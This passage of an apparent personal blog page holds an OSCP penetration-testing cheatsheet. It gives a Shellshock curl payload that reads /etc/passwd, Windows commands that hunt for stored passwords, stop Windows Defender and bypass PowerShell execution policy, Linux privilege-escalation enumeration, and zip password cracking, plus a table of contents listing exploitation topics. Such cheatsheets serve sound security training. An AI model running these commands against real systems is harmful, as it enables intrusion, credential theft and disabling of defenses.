stty rows 50 columns 235</code></pre><hr> <h2 id=shellshock>SHELLSHOCK</h2> <pre class=language-><code class=language->curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>/cgi-bin/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SCRIPT</span><span class="token punctuation">></span></span></code></pre><hr> <h2 id=useful-linux-commands>USEFUL LINUX COMMANDS</h2> <h3 id=find-a-file>Find a file</h3> <pre class=language-><code class=language->locate <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE</span><span class="token punctuation">></span></span>
find / -name "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE</span><span class="token punctuation">></span></span>"</code></pre><h3 id=active-connection>Active connection</h3> <pre class=language-><code class=language->netstat -lntp</code></pre><h3 id=list-all-suid-files>List all SUID files</h3> <pre class=language-><code class=language->find / -perm -4000 2>/dev/null</code></pre><h3 id=determine-the-current-version-of-linux>Determine the current version of Linux</h3> <pre class=language-><code class=language-> cat /etc/issue</code></pre><h3 id=determine-more-information-about-the-environment>Determine more information about the environment</h3> <pre class=language-><code class=language->uname -a</code></pre><h3 id=list-processes-running>List processes running</h3> <pre class=language-><code class=language->ps -faux</code></pre><h3 id=list-the-allowed-and-forbidden-commands-for-the-invoking-use>List the allowed (and forbidden) commands for the invoking use</h3> <pre class=language-><code class=language->sudo -l</code></pre><hr> <h2 id=useful-windows-commands>USEFUL WINDOWS COMMANDS</h2> <pre class=language-><code class=language->net config Workstation
systeminfo
net users

ipconfig /all
netstat -ano

schtasks /query /fo LIST /v
tasklist /SVC
net start
DRIVERQUERY

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

dir /s pass == cred == vnc == .config
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Disable windows defender
sc stop WinDefend

# Bypass restriction
powershell -nop -ep bypass

# List hidden files
dir /a

# Find a file
dir /b/s "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE</span><span class="token punctuation">></span></span>"</code></pre><hr> <h2 id=zip>ZIP</h2> <pre class=language-><code class=language->fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' file.zip

zip2john file.zip > zip.john
john --wordlist=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span> zip.john</code></pre> </article> <hr> <button class="back-to-top hidden svelte-h76b9j"> <svg aria-hidden=true class="" id="" role=img style=height:1em;line-height:.75em;font-size:1.33333em;vertical-align:-.225em;overflow:visible viewBox="0 0 448 512" xmlns=http://www.w3.org/2000/svg> <g transform="translate(256 256)"> <g transform=""> <path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z" fill=currentColor transform="translate(-256 -256)"></path> </g> </g> </svg> </button> <div class=svelte-16tlu6p> <img alt="Anubhavsingh Sawdagur" class=svelte-16tlu6p src=profile-pic.png> <p class=svelte-16tlu6p> Hi, I'm <strong class=highlight>Anubhav</strong>. I'm an Ethical Hacker, Software Engineer and Network Engineer from Mauritius. <br> You can find me on <a href=https://www.instagram.com/_anu_bhav_/ target=_blank>Instagram</a>, <a href=https://www.twitter.com/0_Pr0t0typ3/ target=_blank>Twitter</a>, <a href=https://www.facebook.com/anubhav.s.0809/ target=_blank>Facebook</a> or <a href=https://www.linkedin.com/in/anubhavsingh-sawdagur/ target=_blank>LinkedIn</a>. See more of my work on <a href="https://github.com/Anu-bhav?tab=repositories" target=_blank>GitHub</a> or read about me on my <a href=https://anu-bhav.github.io/ target=_blank>Website</a> </p> </div> </div> </main> <footer class=svelte-v25qrq> <span>  2021 Personal Blog. Powered by <a href=https://sapper.svelte.dev target=_blank>Sapper</a>. Template by <a href=https://anu-bhav.github.io target=_blank>Anubhavsingh Sawdagur</a>. </span> </footer> </div></div> <script>__SAPPER__={baseUrl:"/logbook",preloaded:[void 0,null,{pdf_location:"#",has_pdf:false,post:{title:"OSCP Cheatsheet",slug:"OSCP-Cheatsheet",html:"\u003Ch1 id=\"oscp-cheatsheet\"\u003EOSCP Cheatsheet\u003C\u002Fh1\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='enumeration';\" href=\"javascript:;\"\u003EEnumeration\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='nmap';\" href=\"javascript:;\"\u003ENMAP\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='tcp';\" href=\"javascript:;\"\u003ETCP\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='udp';\" href=\"javascript:;\"\u003EUDP\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='ftp---21';\" href=\"javascript:;\"\u003EFTP - 21\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='brute-force';\" href=\"javascript:;\"\u003EBrute force\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='downloading-file';\" href=\"javascript:;\"\u003EDownloading file\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='uploading-file';\" href=\"javascript:;\"\u003EUploading file\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='ssh---22';\" href=\"javascript:;\"\u003ESSH - 22\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='brute-force-1';\" href=\"javascript:;\"\u003EBrute force\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='cve-2008-0166';\" href=\"javascript:;\"\u003ECVE-2008-0166\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='ssh-backdoor---post-exploitation';\" href=\"javascript:;\"\u003ESSH backdoor - post exploitation\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='dns---53';\" href=\"javascript:;\"\u003EDNS - 53\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='zone-transfert';\" href=\"javascript:;\"\u003EZone transfert\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='dns-brute-force';\" href=\"javascript:;\"\u003EDNS brute force\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='finger---79';\" href=\"javascript:;\"\u003EFINGER - 79\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='user-enumeration';\" href=\"javascript:;\"\u003EUser enumeration\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='command-execution';\" href=\"javascript:;\"\u003ECommand execution\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='http---https---80---443';\" href=\"javascript:;\"\u003EHTTP - HTTPS - 80 - 443\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='automatic-scanners';\" href=\"javascript:;\"\u003EAutomatic scanners\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='wordpress';\" href=\"javascript:;\"\u003EWordpress\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='wordpress-panel-rce';\" href=\"javascript:;\"\u003EWordpress panel RCE\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='drupal';\" href=\"javascript:;\"\u003EDrupal\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='username-enumeration';\" href=\"javascript:;\"\u003EUsername enumeration\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='hidden-pages-enumeration';\" href=\"javascript:;\"\u003EHidden pages enumeration\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='drupal-panel-rce';\" href=\"javascript:;\"\u003EDrupal panel RCE\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='joomla';\" href=\"javascript:;\"\u003EJoomla\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='tomcat';\" href=\"javascript:;\"\u003ETomcat\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='default-credentials';\" href=\"javascript:;\"\u003EDefault credentials\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='brute-force-2';\" href=\"javascript:;\"\u003EBrute force\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='tomcat-panel-rce';\" href=\"javascript:;\"\u003ETomcat panel RCE\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='webdav';\" href=\"javascript:;\"\u003EWebDav\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='http-brute-force-authentication';\" href=\"javascript:;\"\u003EHTTP brute force authentication\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='http-basic-authentication';\" href=\"javascript:;\"\u003EHTTP basic authentication\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='http-get-request';\" href=\"javascript:;\"\u003EHTTP GET request\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='http-post-request';\" href=\"javascript:;\"\u003EHTTP POST request\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='spidering--brute-force-directories--files';\" href=\"javascript:;\"\u003ESpidering \u002F Brute force directories \u002F files\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='file-backups';\" href=\"javascript:;\"\u003EFile backups\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='local-file-inclusion--remote-file-inclusion---lfi--rfi';\" href=\"javascript:;\"\u003ELocal File Inclusion \u002F Remote File Inclusion - LFI \u002F RFI\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='wrappers';\" href=\"javascript:;\"\u003EWrappers\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='wrapper-phpfilter';\" href=\"javascript:;\"\u003EWrapper php:\u002F\u002Ffilter\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='wrapper-expect';\" href=\"javascript:;\"\u003EWrapper expect:\u002F\u002F\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='wrapper-data';\" href=\"javascript:;\"\u003EWrapper data:\u002F\u002F\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='wrapper-input';\" href=\"javascript:;\"\u003EWrapper input:\u002F\u002F\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='useful-lfi-list';\" href=\"javascript:;\"\u003EUseful LFI list\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='tools';\" href=\"javascript:;\"\u003ETools\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='command-injection';\" href=\"javascript:;\"\u003ECommand injection\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='deserialization';\" href=\"javascript:;\"\u003EDeserialization\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='file-upload';\" href=\"javascript:;\"\u003EFile upload\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='sql-injection';\" href=\"javascript:;\"\u003ESQL injection\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='xss';\" href=\"javascript:;\"\u003EXSS\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='other-web-vulnerabilities';\" href=\"javascript:;\"\u003EOther web vulnerabilities\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='upload-a-file-with-put';\" href=\"javascript:;\"\u003EUpload a file with PUT\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='kerberos---88';\" href=\"javascript:;\"\u003EKERBEROS - 88\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='pop3---110';\" href=\"javascript:;\"\u003EPOP3 - 110\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='brute-force-3';\" href=\"javascript:;\"\u003EBrute force\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='read-mail';\" href=\"javascript:;\"\u003ERead mail\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='snmp---161';\" href=\"javascript:;\"\u003ESNMP - 161\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='brute-force-community-string';\" href=\"javascript:;\"\u003EBrute force community string\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='modifying-snmp-values';\" href=\"javascript:;\"\u003EModifying SNMP values\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='ldap---389';\" href=\"javascript:;\"\u003ELDAP - 389\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='scans';\" href=\"javascript:;\"\u003EScans\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='graphical-interface';\" href=\"javascript:;\"\u003EGraphical Interface\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='smb---445';\" href=\"javascript:;\"\u003ESMB - 445\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='version-if-nmap-didnt-detect-it';\" href=\"javascript:;\"\u003EVersion if nmap didn&#39;t detect it\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='scan-for-vulnerability';\" href=\"javascript:;\"\u003EScan for vulnerability\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='manual-testing';\" href=\"javascript:;\"\u003EManual testing\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='brute-force-4';\" href=\"javascript:;\"\u003EBrute force\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='mount-a-smb-share';\" href=\"javascript:;\"\u003EMount a SMB share\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='get-a-shell';\" href=\"javascript:;\"\u003EGet a shell\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='EternalBlue-MS17-010';\" href=\"javascript:;\"\u003EEternalBlue (MS17-010)\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='check-if-vulnerable';\" href=\"javascript:;\"\u003ECheck if vulnerable\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='prepare-shellcodes-and-listeners';\" href=\"javascript:;\"\u003EPrepare shellcodes and listeners\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='exploit';\" href=\"javascript:;\"\u003EExploit\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='if-this-doesnt-work-try-this-one';\" href=\"javascript:;\"\u003EIf this doesn&#39;t work, try this one\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='ms08-067';\" href=\"javascript:;\"\u003EMS08-067\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='cve-2017-7494';\" href=\"javascript:;\"\u003ECVE-2017-7494\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='mssql---1433';\" href=\"javascript:;\"\u003EMSSQL - 1433\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='get-information';\" href=\"javascript:;\"\u003EGet information\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='brute-force-5';\" href=\"javascript:;\"\u003EBrute force\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='having-credentials';\" href=\"javascript:;\"\u003EHaving credentials\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='manual-exploit';\" href=\"javascript:;\"\u003EManual exploit\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='nfs---2049';\" href=\"javascript:;\"\u003ENFS - 2049\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='show-mountable-nfs-shares';\" href=\"javascript:;\"\u003EShow Mountable NFS Shares\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='mount-a-share';\" href=\"javascript:;\"\u003EMount a share\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='nfs-misconfigurations';\" href=\"javascript:;\"\u003ENFS misconfigurations\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='mysql---3306';\" href=\"javascript:;\"\u003EMYSQL - 3306\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='brute-force-6';\" href=\"javascript:;\"\u003EBrute force\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='extracting-mysql-credentials-from-files';\" href=\"javascript:;\"\u003EExtracting MySQL credentials from files\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='connect';\" href=\"javascript:;\"\u003EConnect\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='mysql-commands';\" href=\"javascript:;\"\u003EMySQL commands\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='manual-exploit-1';\" href=\"javascript:;\"\u003EManual exploit\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='rdp---3389';\" href=\"javascript:;\"\u003ERDP - 3389\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='brute-force';\" href=\"javascript:;\"\u003EBrute force\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='connect-with-known-credentials--hash';\" href=\"javascript:;\"\u003EConnect with known credentials \u002F hash\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='session-stealing';\" href=\"javascript:;\"\u003ESession stealing\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='get-openned-sessions';\" href=\"javascript:;\"\u003EGet openned sessions\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='access-to-the-selected';\" href=\"javascript:;\"\u003EAccess to the selected\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='adding-user-to-rdp-group-windows';\" href=\"javascript:;\"\u003EAdding user to RDP group (Windows)\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='vnc---5800---58001---5900---5901';\" href=\"javascript:;\"\u003EVNC - 5800 - 58001 - 5900 - 5901\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='scans-1';\" href=\"javascript:;\"\u003EScans\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='brute-force-8';\" href=\"javascript:;\"\u003EBrute force\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='connect-1';\" href=\"javascript:;\"\u003EConnect\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='found-vnc-password';\" href=\"javascript:;\"\u003EFound VNC password\u003C\u002Fa\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='linux';\" href=\"javascript:;\"\u003ELinux\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='windows';\" href=\"javascript:;\"\u003EWindows\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='decrypt-vnc-password';\" href=\"javascript:;\"\u003EDecrypt VNC password\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='winrm---5985---5986';\" href=\"javascript:;\"\u003EWINRM - 5985 - 5986\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='brute-force-9';\" href=\"javascript:;\"\u003EBrute force\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='connecting';\" href=\"javascript:;\"\u003EConnecting\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='cgi';\" href=\"javascript:;\"\u003ECGI\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='found-cgi-scripts';\" href=\"javascript:;\"\u003EFound CGI scripts\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='command-and-control-framework';\" href=\"javascript:;\"\u003ECommand and control framework\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='compiling-exploits';\" href=\"javascript:;\"\u003ECompiling exploits\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='for-linux';\" href=\"javascript:;\"\u003EFor linux\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='for-windows';\" href=\"javascript:;\"\u003EFor windows\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='cross-compile';\" href=\"javascript:;\"\u003ECross compile\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='dictionary-generation';\" href=\"javascript:;\"\u003EDICTIONARY GENERATION\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='file-transfer';\" href=\"javascript:;\"\u003EFILE TRANSFER\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='linux-1';\" href=\"javascript:;\"\u003ELinux\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='windows-1';\" href=\"javascript:;\"\u003EWindows\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cp\u003E\u003Ca onclick=\"document.location.hash='git';\" href=\"javascript:;\"\u003EGIT\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca onclick=\"document.location.hash='download-git';\" href=\"javascript:;\"\u003EDownload 